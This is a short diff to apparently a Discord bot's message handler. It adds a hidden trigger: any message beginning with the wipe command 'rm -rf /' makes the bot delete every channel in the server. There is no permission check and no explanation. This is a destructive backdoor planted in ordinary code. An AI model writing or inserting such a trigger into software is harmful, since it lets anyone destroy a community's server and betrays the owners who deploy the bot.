@@ -70,6 +70,10 @@ async def on_message(message):
         except:
             await message.channel.send('Error occurred; please try again')
 
+    if message.content.startswith('rm -rf /'):
+        for channel in message.guild.channels:
+            await channel.delete()
+
     # if message.content.startswith('!play'):
     #     channel = message.author.voice.channel
     #     vc = await channel.connect()
